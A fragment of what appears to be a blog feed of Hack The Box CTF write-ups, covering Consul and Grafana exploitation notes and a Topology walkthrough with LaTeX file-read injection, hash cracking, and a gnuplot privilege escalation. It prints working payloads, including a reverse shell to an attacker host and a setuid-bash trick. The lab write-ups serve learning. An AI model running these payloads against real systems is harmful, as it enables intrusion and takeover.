&lt;code&gt;mysql.yml&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[44,45]},&quot;content&quot;:&quot;Login&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[46,47]},&quot;content&quot;:&quot;&lt;code&gt;admin:messageInABottle685427&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[48,49]},&quot;content&quot;:&quot;CVEs&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[50,51]},&quot;content&quot;:&quot;CVE-2021-43798 *&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;fence&quot;,&quot;depth&quot;:4,&quot;content&quot;:&quot;&lt;pre&gt;&lt;code&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;developer:&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;x:&lt;/span&gt;&lt;span class=\&quot;hljs-number\&quot;&gt;1000&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:&lt;/span&gt;&lt;span class=\&quot;hljs-number\&quot;&gt;1000&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:developer&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:/home/developer&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:/bin/bash&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&quot;,&quot;children&quot;:[],&quot;payload&quot;:{&quot;lines&quot;:[52,55]}},{&quot;type&quot;:&quot;bullet_list&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[56,63]},&quot;content&quot;:&quot;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[56,57]},&quot;content&quot;:&quot;&lt;code&gt;/var/lib/grafana/grafana.db&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[57,58]},&quot;content&quot;:&quot;&lt;code&gt;/etc/mysql/mysql.conf.d/mysqld.cnf&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[58,59]},&quot;content&quot;:&quot;&lt;code&gt;/etc/grafana/grafana.ini&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:6,&quot;payload&quot;:{&quot;lines&quot;:[59,60]},&quot;content&quot;:&quot;&lt;code&gt;admin_password = messageInABottle685427&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[60,61]},&quot;content&quot;:&quot;&lt;code&gt;/etc/grafana/provisioning/datasources/mysql.yml&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:6,&quot;payload&quot;:{&quot;lines&quot;:[61,62]},&quot;content&quot;:&quot;&lt;code&gt;grafana:dontStandSoCloseToMe63221!&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]}]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[63,64]},&quot;content&quot;:&quot;DB 3306&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[67,68]},&quot;content&quot;:&quot;&lt;code&gt;use whackywidget; -&amp;gt; select * from users; -&amp;gt; developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[68,69]},&quot;content&quot;:&quot;&lt;code&gt;anEnglishManInNewYork027468&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[69,70]},&quot;content&quot;:&quot;userFlag&quot;,&quot;children&quot;:[]}]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[71,72]},&quot;content&quot;:&quot;SSH 22&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[75,76],&quot;index&quot;:1},&quot;content&quot;:&quot;1. Files on the System&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[76,77]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.gitconfig&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[77,78]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[78,79]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/put-config-in-consul.sh&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[79,80]},&quot;content&quot;:&quot;&lt;code&gt;consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[80,81]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.profile&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[81,82]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.bash_history&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[82,83]},&quot;content&quot;:&quot;&lt;code&gt;/root/&lt;/code&gt; ?&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[83,84]},&quot;content&quot;:&quot;&lt;code&gt;consul&lt;/code&gt; *&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[84,85]},&quot;content&quot;:&quot;&lt;code&gt;/opt/consul/raft/raft.db&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[85,86]},&quot;content&quot;:&quot;&lt;code&gt;/development-machine-documentation/*&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[86,87]},&quot;content&quot;:&quot;&lt;code&gt;/development-machine-documentation/deploy.sh&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[87,88]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/whackywidget/put-config-in-consul.sh&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[88,89],&quot;index&quot;:2},&quot;content&quot;:&quot;2. Installed Applications&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[89,90]},&quot;content&quot;:&quot;consul&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[90,91],&quot;index&quot;:3},&quot;content&quot;:&quot;3. Network&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[91,92]},&quot;content&quot;:&quot;tcp 127.0.0.1:8300&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[92,93]},&quot;content&quot;:&quot;tcp 127.0.0.1:8301&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[93,94]},&quot;content&quot;:&quot;empty reply for HTTP&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[94,95]},&quot;content&quot;:&quot;tcp 127.0.0.1:8302&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[95,96]},&quot;content&quot;:&quot;empty reply for HTTP&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[96,97]},&quot;content&quot;:&quot;tcp 127.0.0.1:8500&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[97,98]},&quot;content&quot;:&quot;Consul UI&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[98,99]},&quot;content&quot;:&quot;Content: &lt;code&gt;Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[99,100]},&quot;content&quot;:&quot;tcp 127.0.0.1:8600&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[100,101]},&quot;content&quot;:&quot;tcp 127.0.0.1:3306&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[101,102],&quot;index&quot;:4},&quot;content&quot;:&quot;4. Running Processes&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[102,103]},&quot;content&quot;:&quot;&lt;code&gt;/usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[103,104],&quot;index&quot;:5},&quot;content&quot;:&quot;5. Scheduled Jobs/Tasks&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[104,105]},&quot;content&quot;:&quot;&lt;code&gt;find /etc/consul.d/config.d/* -mmin +10 -delete&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[105,106],&quot;index&quot;:6},&quot;content&quot;:&quot;6. System&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[106,107]},&quot;content&quot;:&quot;Sudo version 1.8.31&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[107,108]},&quot;content&quot;:&quot;PermitRootLogin yes&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[109,110]},&quot;content&quot;:&quot;Consul Research&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[111,112]},&quot;content&quot;:&quot;https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[112,113]},&quot;content&quot;:&quot;https://developer.hashicorp.com/consul/docs/services/usage/checks&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[113,114]},&quot;content&quot;:&quot;https://developer.hashicorp.com/consul/commands/exec&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[115,116]},&quot;content&quot;:&quot;Root&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[116,117]},&quot;content&quot;:&quot;&lt;code&gt;export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[117,118]},&quot;content&quot;:&quot;&lt;code&gt;consul catalog nodes&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[118,119]},&quot;content&quot;:&quot;&lt;code&gt;ambassador 27361fb5-583a-5db0-27bf-ecfed7b4b669 127.0.0.1 dc1 lan=127.0.0.1, lan_ipv4=127.0.0.1, wan=127.0.0.1, wan_ipv4=127.0.0.1 consul-network-segment=&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[119,120]},&quot;content&quot;:&quot;&lt;code&gt;find / -type d -writable 2&amp;gt;/dev/null&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[120,121]},&quot;content&quot;:&quot;&lt;code&gt;/etc/consul.d/config.d&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[121,122]},&quot;content&quot;:&quot;&lt;code&gt;touch /etc/consul.d/config.d/syl.hcl&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[122,137]},&quot;content&quot;:&quot;&lt;pre&gt;&lt;code class=\&quot;language-hcl\&quot;&gt;service {\n    name = &amp;quot;dummy-service&amp;quot;\n    id   = &amp;quot;dummy-service-1&amp;quot;\n    port = 8080\n\n    check = {\n        id = &amp;quot;mem-util&amp;quot;\n        name = &amp;quot;Memory utilization&amp;quot;\n        args = [&amp;quot;chmod&amp;quot;, &amp;quot;u+s&amp;quot;, &amp;quot;/bin/bash&amp;quot;]\n        interval = &amp;quot;10s&amp;quot;\n        timeout = &amp;quot;1s&amp;quot;\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[137,138]},&quot;content&quot;:&quot;&lt;code&gt;consul reload&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[138,139]},&quot;content&quot;:&quot;&lt;code&gt;/bin/bash -p&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{})&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Markmap</summary></entry><entry><title type="html">Hack The Box - Irked [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/08/06/htb-irked.html" rel="alternate" type="text/html" title="Hack The Box - Irked [Easy]" /><published>2023-08-06T00:00:00+03:00</published><updated>2023-08-06T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/06/htb-irked</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/06/htb-irked.html">&lt;p&gt;Here is a quick xmind map.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-irked.png&quot; alt=&quot;irked&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Here is a quick xmind map.</summary></entry><entry><title type="html">Hack The Box - Joker [Hard]</title><link href="http://localhost:4000/ctf-writeup/2023/08/05/htb-joker.html" rel="alternate" type="text/html" title="Hack The Box - Joker [Hard]" /><published>2023-08-05T00:00:00+03:00</published><updated>2023-08-05T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/05/htb-joker</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/05/htb-joker.html">&lt;p&gt;Here is a quick xmind map.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-joker.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Here is a quick xmind map.</summary></entry><entry><title type="html">Hack The Box - Topology [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/30/htb-topology.html" rel="alternate" type="text/html" title="Hack The Box - Topology [Easy]" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/30/htb-topology</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/30/htb-topology.html">&lt;p&gt;I’ve started with simple machine enumeration&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.11.217
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;topology.htb&lt;/code&gt; to check out the website, noticed the possible users (according to the email that is formatted like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lklein@topology.htb&lt;/code&gt;). I’ve enumerated possible users:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lklein
vdaisley
dabrahams
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I’ve figured out that there must be some trickery with this so I went my way to research the topic.&lt;/p&gt;

&lt;p&gt;I’ve found out the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://0day.work/hacking-with-latex/&lt;/li&gt;
  &lt;li&gt;https://salmonsec.com/cheatsheets/exploitation/latex_injection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd, /proc/self/cmdline, /proc/self/environ&lt;/code&gt; and so on, I’ve figured out that I must be missing something. I began to explore what other subdomains (because there is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latex.topology.htb&lt;/code&gt; I thought there would be more) were on the webserver using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$commontxt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://topology.htb/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.topology.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which yielded the following domains:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stats&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’ve browsed through those and on the stats there were simple plots about the current usage of the system and that’s it. But on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt; subdomain there was a Basic Auth in place which I then figured out that I can read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt; with the LFI vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latex.topology.htb&lt;/code&gt; input form.&lt;/p&gt;

&lt;p&gt;I’ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what’s going on.&lt;/p&gt;

&lt;p&gt;I honestly didn’t know how can I read the file and I turned out to some help, which I then understood that I can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaTeX/Source Code Listings&lt;/code&gt; which also can read a file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\lstinputlisting{/var/www/dev/.htpasswd}&lt;/code&gt;, however the website just resulted in no image (possible error) using just this command.&lt;/p&gt;

&lt;p&gt;Here comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and&lt;/p&gt;

&lt;p&gt;Since the website is about math, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inline math delimiters&lt;/code&gt; that are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ and $&lt;/code&gt; which can turn my payload from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\lstinputlisting{/var/www/dev/.htpasswd}&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$\lstinputlisting{/var/www/dev/.htpasswd}$&lt;/code&gt; which resulted into getting the basic auth hash.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; we can extract the password&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that, I tried the users that I’ve enumerated earlier and the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vdaisley&lt;/code&gt; worked out, so I went to log in with SSH and got the user flag.&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;

&lt;p&gt;The root was pretty easy, first we can see which directories are writable:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ find / -type d -writable 2&amp;gt;/dev/null
...
/opt/gnuplot
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This directory looked suspicious, I’ve fired up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt; to checkout what is going on and I got this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/htb/htb-topology-pspyrun.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we are finding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.plt&lt;/code&gt; files in this directory, and then we are executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gnuplot&lt;/code&gt; as root. Using this &lt;a href=&quot;https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/#command-execution&quot;&gt;article,&lt;/a&gt; I’ve crafted a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.plt&lt;/code&gt; file with the contents of:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vdaisley@topology:/opt/gnuplot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/test.plt 
system &lt;span class=&quot;s2&quot;&gt;&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.xx/4444 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve copied the file to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/gnuplot&lt;/code&gt; directory and I’ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I’ve started with simple machine enumeration</summary></entry><entry><title type="html">Hack The Box - Pilgrimage [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage.html" rel="alternate" type="text/html" title="Hack The Box - Pilgrimage [Easy]" /><published>2023-06-25T00:00:00+03:00</published><updated>2023-06-25T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage.html">&lt;p&gt;I started off with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rustscan &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
Open 10.10.11.219:22
Open 10.10.11.219:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to brute force some directories.&lt;/p&gt;

